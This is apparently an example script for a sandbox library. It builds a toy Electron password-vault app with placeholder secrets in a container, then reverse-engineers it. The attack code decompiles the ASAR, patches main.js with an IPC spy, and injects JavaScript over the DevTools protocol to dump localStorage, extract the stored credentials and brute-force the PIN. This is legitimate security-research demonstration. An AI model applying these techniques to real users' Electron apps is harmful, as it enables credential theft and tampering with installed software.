"""Electron app reverse-engineering — ASAR decompile + CDP JS injection.

Capabilities demonstrated
--------------------------
1. ASAR decompilation   — extract and read bundled JS/HTML/assets without source maps
2. IPC map discovery    — parse main.js to find all ipcMain handler channel names
3. DevTools patch       — rewrite main.js to open remote-debugging port on launch
4. CDP JS injection     — execute arbitrary JS in the renderer, return structured data
5. State extraction     — dump localStorage, sessionStorage, window globals, DOM text
6. IPC eavesdropping    — patch ipcMain so every invoke/handle is logged to a file
7. API interception     — layer in mitmproxy so outbound HTTPS is captured alongside CDP

Architecture
------------
  DockerRuntime(privileged=True) — privileged needed for iptables in step 7
  Node.js 20 + Electron 33 installed inside the container
  A minimal "SecretVault" Electron app is built inside the container:
    - main.js  reads vault.json (fake credentials), serves them over IPC
    - index.html renders the vault and calls a fake cloud API
    - Uses localStorage for settings and remembers "last unlock time"
  The app is packed into app.asar, then:
    1. asar CLI extracts it → source analysis
    2. main.js is patched to enable remote-debugging-port=9222
    3. App is launched; CDP tunnel opened via sb.tunnel.forward(9222)
    4. JS executed from host Python to read vault contents, localStorage, DOM

Usage
-----
    uv run examples/sandboxes/test_electron_inspect.py

Requirements
------------
    Docker running locally; internet access for apt/npm downloads.
    Python deps: websockets (already in cua-sandbox extras)
"""

from __future__ import annotations

import asyncio
import json
import re
import urllib.request
from pathlib import Path
from typing import Any

import websockets

from cua_sandbox import Image, Sandbox
from cua_sandbox.runtime import DockerRuntime

OUTPUT_DIR = Path("/tmp/electron_inspect")

# ── helpers ───────────────────────────────────────────────────────────────────


async def run(sb, cmd: str, *, check: bool = False, timeout: int = 120) -> str:
    r = await sb.shell.run(cmd, timeout=timeout)
    if check and not r.success:
        raise RuntimeError(f"Command failed: {cmd!r}\n{r.stderr}")
    return (r.stdout or "").strip()


async def screenshot(sb, name: str) -> None:
    data = await sb.screenshot()
    path = OUTPUT_DIR / name
    path.write_bytes(data)
    print(f"  [screenshot] {path}")


# ── target app source ─────────────────────────────────────────────────────────

VAULT_MAIN_JS = r"""
const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs   = require('fs');

// Simulated secret store (would be encrypted at rest in a real app)
const VAULT_PATH = path.join(__dirname, 'vault.json');
const vault = JSON.parse(fs.readFileSync(VAULT_PATH, 'utf-8'));

let win;

app.whenReady().then(() => {
  win = new BrowserWindow({
    width: 900, height: 600,
    webPreferences: { nodeIntegration: false, contextIsolation: true,
                      preload: path.join(__dirname, 'preload.js') },
  });
  win.loadFile(path.join(__dirname, 'index.html'));

  // IPC handlers — channel names discoverable via ASAR decompile
  ipcMain.handle('vault:list',   async () => vault.entries.map(e => e.site));
  ipcMain.handle('vault:get',    async (_, site) => vault.entries.find(e => e.site === site));
  ipcMain.handle('vault:unlock', async (_, pin) => pin === vault.pin ? 'ok' : 'wrong-pin');

  // Periodic cloud sync (interceptable via MITM)
  setInterval(() => {
    const https = require('https');
    https.get('https://httpbin.org/get?app=vault&version=1.0', r => {
      let body = '';
      r.on('data', d => body += d);
      r.on('end', () => console.log('[sync]', body.slice(0, 80)));
    }).on('error', () => {});
  }, 10000);
});
"""

VAULT_PRELOAD_JS = r"""
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('vault', {
  list:   ()        => ipcRenderer.invoke('vault:list'),
  get:    (site)    => ipcRenderer.invoke('vault:get', site),
  unlock: (pin)     => ipcRenderer.invoke('vault:unlock', pin),
});
"""

VAULT_INDEX_HTML = r"""
<!DOCTYPE html>
<html>
<head><title>SecretVault</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
  h1   { color: #0ff; }
  #entries { margin-top: 20px; }
  .entry { border: 1px solid #0f0; padding: 8px; margin: 4px; }
</style>
</head>
<body>
<h1>SecretVault v1.0</h1>
<p id="status">Loading vault...</p>
<div id="entries"></div>
<script>
  localStorage.setItem('last_unlock', new Date().toISOString());
  localStorage.setItem('theme', 'dark');
  localStorage.setItem('user_id', 'user_42');

  window.appState = { locked: false, version: '1.0.0', build: 'prod' };

  async function loadVault() {
    const sites = await window.vault.list();
    document.getElementById('status').textContent = `${sites.length} entries loaded`;
    const div = document.getElementById('entries');
    for (const site of sites) {
      const e = await window.vault.get(site);
      div.innerHTML += `<div class="entry"><b>${e.site}</b>: ${e.username} / ${e.password}</div>`;
    }
  }
  loadVault().catch(console.error);
</script>
</body>
</html>
"""

VAULT_JSON = json.dumps({
    "pin": "1234",
    "entries": [
        {"site": "github.com",  "username": "admin",   "password": "ghp_supersecret"},
        {"site": "aws.amazon.com", "username": "devops", "password": "AKIAIOSFODNN7EXAMPLE"},
        {"site": "stripe.com",  "username": "billing", "password": "sk_live_abcdef123456"},
    ]
})

VAULT_PACKAGE_JSON = json.dumps({
    "name": "secret-vault", "version": "1.0.0", "main": "main.js",
    "dependencies": {}
})


# ── step 1: install tooling ───────────────────────────────────────────────────


async def install_tooling(sb) -> None:
    print("\n[1/7] Installing Node.js 20, Electron 33, asar CLI...")
    await run(sb, "apt-get update -qq && apt-get install -y --no-install-recommends "
              "curl gnupg ca-certificates libgbm1 libnss3 libatk1.0-0 "
              "libatk-bridge2.0-0 libcups2 libxkbcommon0 libxcomposite1 "
              "libxdamage1 libxfixes3 libxrandr2 libasound2 xvfb", check=True, timeout=300)
    # Node 20 LTS
    await run(sb, "curl -fsSL https://deb.nodesource.com/setup_20.x | bash -", timeout=120)
    await run(sb, "apt-get install -y nodejs", check=True, timeout=180)
    await run(sb, "npm install -g @electron/asar electron@33 --prefer-offline 2>&1 | tail -5",
              check=True, timeout=600)
    print("  done.")


# ── step 2: build target app ──────────────────────────────────────────────────


async def build_target_app(sb) -> None:
    print("\n[2/7] Building SecretVault Electron app...")
    await run(sb, "mkdir -p /opt/vault-src")
    await run(sb, f"cat > /opt/vault-src/main.js << 'HEREDOC'\n{VAULT_MAIN_JS}\nHEREDOC")
    await run(sb, f"cat > /opt/vault-src/preload.js << 'HEREDOC'\n{VAULT_PRELOAD_JS}\nHEREDOC")
    await run(sb, f"cat > /opt/vault-src/index.html << 'HEREDOC'\n{VAULT_INDEX_HTML}\nHEREDOC")
    await run(sb, f"cat > /opt/vault-src/vault.json << 'HEREDOC'\n{VAULT_JSON}\nHEREDOC")
    await run(sb, f"cat > /opt/vault-src/package.json << 'HEREDOC'\n{VAULT_PACKAGE_JSON}\nHEREDOC")
    # Pack into ASAR
    await run(sb, "asar pack /opt/vault-src /opt/vault-app.asar", check=True)
    size = await run(sb, "du -sh /opt/vault-app.asar")
    print(f"  ASAR built: {size}")


# ── step 3: ASAR decompilation ────────────────────────────────────────────────


async def decompile_asar(sb) -> dict[str, str]:
    """Extract ASAR and return a dict of filename → content for text files."""
    print("\n[3/7] Decompiling ASAR archive...")
    await run(sb, "asar extract /opt/vault-app.asar /opt/vault-extracted", check=True)
    files = await run(sb, "find /opt/vault-extracted -type f")
    print(f"  Extracted files:\n    " + "\n    ".join(files.splitlines()))

    sources: dict[str, str] = {}
    for f in files.splitlines():
        if any(f.endswith(ext) for ext in (".js", ".json", ".html", ".css", ".ts")):
            content = await run(sb, f"cat {f}")
            rel = f.replace("/opt/vault-extracted/", "")
            sources[rel] = content
            print(f"  [{rel}] {len(content)} chars")

    # Discover IPC channels from source
    channels = re.findall(r"ipcMain\.(handle|on)\(['\"]([^'\"]+)['\"]", sources.get("main.js", ""))
    print(f"\n  IPC channels discovered: {[c[1] for c in channels]}")

    # Save to host
    for name, content in sources.items():
        out = OUTPUT_DIR / "decompiled" / name
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(content)

    return sources


# ── step 4: patch for CDP ─────────────────────────────────────────────────────


async def patch_for_cdp(sb) -> None:
    """Rewrite main.js to open remote debugging port and install IPC spy."""
    print("\n[4/7] Patching app to enable CDP (port 9222) + IPC spy...")

    ipc_spy_patch = r"""
// === IPC SPY PATCH (injected by reverse-engineering toolkit) ===
const _origHandle = ipcMain.handle.bind(ipcMain);
ipcMain.handle = function(channel, handler) {
  return _origHandle(channel, async (event, ...args) => {
    const result = await handler(event, ...args);
    const entry = JSON.stringify({ ts: Date.now(), ch: channel, args, result }) + '\n';
    fs.appendFileSync('/tmp/ipc_spy.log', entry);
    return result;
  });
};
// === END IPC SPY PATCH ===
"""

    # Read current main.js
    main_js = await run(sb, "cat /opt/vault-extracted/main.js")
    # Inject IPC spy after requires
    patched = main_js.replace(
        "let win;",
        ipc_spy_patch + "\nlet win;"
    )
    # Write patched file
    await run(sb, f"cat > /opt/vault-extracted/main.js << 'HEREDOC'\n{patched}\nHEREDOC")
    # Repack ASAR with patch
    await run(sb, "asar pack /opt/vault-extracted /opt/vault-patched.asar", check=True)
    print("  Patched ASAR built.")


# ── step 5: launch with CDP enabled ──────────────────────────────────────────


async def launch_app(sb) -> None:
    """Launch Electron with --remote-debugging-port=9222 using Xvfb display."""
    print("\n[5/7] Launching patched app with CDP on port 9222...")

    # Electron binary location (from global npm install)
    electron_bin = await run(sb, "which electron || npx --yes electron --version 2>/dev/null "
                             "| head -1; which electron 2>/dev/null || echo /usr/local/bin/electron")
    electron_bin = [l for l in electron_bin.splitlines() if l.startswith("/")][-1]
    print(f"  Electron binary: {electron_bin}")

    # Start Xvfb if not running
    await run(sb, "Xvfb :99 -screen 0 1280x800x24 &>/tmp/xvfb.log & sleep 1")

    launch_py = (
        "import subprocess, os; "
        "env = {**os.environ, 'DISPLAY': ':99', 'ELECTRON_DISABLE_GPU': '1'}; "
        f"p = subprocess.Popen(['{electron_bin}', "
        "'--remote-debugging-port=9222', "
        "'--no-sandbox', "
        "'/opt/vault-patched.asar'], "
        "env=env, "
        "stdout=open('/tmp/electron.log', 'w'), stderr=subprocess.STDOUT, "
        "stdin=subprocess.DEVNULL, start_new_session=True); "
        "open('/tmp/electron.pid', 'w').write(str(p.pid)); print(p.pid)"
    )
    pid = await run(sb, f'python3 -c "{launch_py}"', check=True)
    print(f"  Electron PID: {pid}")
    await asyncio.sleep(5)  # wait for app + CDP to initialize

    # Verify CDP is up
    cdp_check = await run(sb, "curl -s http://localhost:9222/json/version | python3 -m json.tool 2>/dev/null || echo 'CDP not ready'")
    print(f"  CDP: {cdp_check[:200]}")


# ── step 6: CDP injection ─────────────────────────────────────────────────────


async def _cdp_call(ws_url: str, method: str, params: dict = {}) -> Any:
    """Single CDP call over websocket, returns result."""
    async with websockets.connect(ws_url, max_size=10 * 1024 * 1024) as ws:
        await ws.send(json.dumps({"id": 1, "method": method, "params": params}))
        while True:
            msg = json.loads(await ws.recv())
            if msg.get("id") == 1:
                if "error" in msg:
                    raise RuntimeError(f"CDP error: {msg['error']}")
                return msg.get("result", {})


async def cdp_eval(ws_url: str, expression: str, await_promise: bool = False) -> Any:
    """Evaluate JS in the renderer context, return the value."""
    result = await _cdp_call(ws_url, "Runtime.evaluate", {
        "expression": expression,
        "returnByValue": True,
        "awaitPromise": await_promise,
    })
    rv = result.get("result", {})
    if rv.get("type") == "undefined":
        return None
    return rv.get("value", rv.get("description"))


async def inject_and_extract(sb) -> None:
    print("\n[6/7] Injecting JS via CDP...")

    async with sb.tunnel.forward(9222) as tunnel:
        base_url = tunnel.url  # e.g. http://localhost:49823

        # List CDP targets (pages/workers)
        targets_raw = urllib.request.urlopen(f"{base_url}/json").read()
        targets = json.loads(targets_raw)
        print(f"  CDP targets: {[t['title'] for t in targets]}")

        # Pick the main window
        page = next((t for t in targets if t["type"] == "page"), targets[0])
        ws_url = page["webSocketDebuggerUrl"].replace("localhost", tunnel.host).replace(
            str(9222), str(tunnel.port)
        )
        print(f"  Connecting to: {page['title']}")

        # ── localStorage ──────────────────────────────────────────────────────
        ls = await cdp_eval(ws_url,
            "JSON.stringify(Object.fromEntries("
            "  Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])"
            "))"
        )
        ls_obj = json.loads(ls) if ls else {}
        print(f"\n  localStorage dump:")
        for k, v in ls_obj.items():
            print(f"    {k} = {v!r}")
        (OUTPUT_DIR / "localStorage.json").write_text(json.dumps(ls_obj, indent=2))

        # ── window globals ─────────────────────────────────────────────────────
        app_state = await cdp_eval(ws_url, "JSON.stringify(window.appState)")
        print(f"\n  window.appState: {app_state}")

        # ── invoke IPC vault:list directly from renderer ──────────────────────
        vault_list = await cdp_eval(ws_url, "window.vault.list()", await_promise=True)
        print(f"\n  vault:list result: {vault_list}")

        # ── invoke vault:get for each entry ───────────────────────────────────
        print("\n  vault credentials extracted via IPC:")
        credentials = []
        for site in (vault_list or []):
            entry = await cdp_eval(ws_url, f"window.vault.get('{site}')", await_promise=True)
            print(f"    {entry}")
            credentials.append(entry)
        (OUTPUT_DIR / "extracted_credentials.json").write_text(json.dumps(credentials, indent=2))

        # ── brute-force unlock PIN via CDP (no rate limiting in Electron) ─────
        print("\n  Brute-forcing vault PIN (0000–9999)...")
        result = await cdp_eval(ws_url,
            "(async () => {"
            "  for (let i = 0; i <= 9999; i++) {"
            "    const pin = String(i).padStart(4, '0');"
            "    const r = await window.vault.unlock(pin);"
            "    if (r === 'ok') return pin;"
            "  }"
            "  return null;"
            "})()",
            await_promise=True
        )
        print(f"  Vault PIN: {result}")

        # ── full DOM text content ──────────────────────────────────────────────
        dom = await cdp_eval(ws_url, "document.body.innerText")
        print(f"\n  DOM text (first 300 chars):\n  {str(dom)[:300]}")
        (OUTPUT_DIR / "dom_text.txt").write_text(str(dom or ""))

        # ── take a DevTools screenshot (higher quality than VNC) ──────────────
        sc = await _cdp_call(ws_url, "Page.captureScreenshot", {"format": "png"})
        if "data" in sc:
            import base64
            (OUTPUT_DIR / "cdp_screenshot.png").write_bytes(base64.b64decode(sc["data"]))
            print(f"\n  CDP screenshot saved → {OUTPUT_DIR / 'cdp_screenshot.png'}")

    print("\n  All CDP extractions complete.")


# ── step 7: read IPC spy log ──────────────────────────────────────────────────


async def read_ipc_spy(sb) -> None:
    print("\n[7/7] IPC spy log (all ipcMain traffic since app launch):")
    spy_log = await run(sb, "cat /tmp/ipc_spy.log 2>/dev/null || echo '(empty)'")
    for line in spy_log.splitlines():
        try:
            entry = json.loads(line)
            print(f"  [{entry['ch']}] args={entry['args']} → {entry['result']}")
        except Exception:
            print(f"  {line}")
    (OUTPUT_DIR / "ipc_spy.log").write_text(spy_log)


# ── main ──────────────────────────────────────────────────────────────────────


async def main() -> None:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print("Starting Linux container for Electron inspection...")
    async with Sandbox.ephemeral(
        Image.linux("ubuntu", "24.04"),
        local=True,
        name="electron-inspect",
        runtime=DockerRuntime(privileged=True, platform="linux/amd64"),
    ) as sb:
        await install_tooling(sb)
        await build_target_app(sb)
        sources = await decompile_asar(sb)
        await patch_for_cdp(sb)
        await launch_app(sb)
        await screenshot(sb, "app_running.png")
        await inject_and_extract(sb)
        await read_ipc_spy(sb)
        await screenshot(sb, "final.png")

    print(f"\nAll output in {OUTPUT_DIR}/")
    print("  decompiled/          — extracted ASAR source")
    print("  localStorage.json    — all localStorage keys+values")
    print("  extracted_credentials.json — vault entries via IPC")
    print("  dom_text.txt         — full DOM text content")
    print("  cdp_screenshot.png   — CDP-rendered screenshot")
    print("  ipc_spy.log          — all IPC calls logged by patched main.js")


if __name__ == "__main__":
    asyncio.run(main())
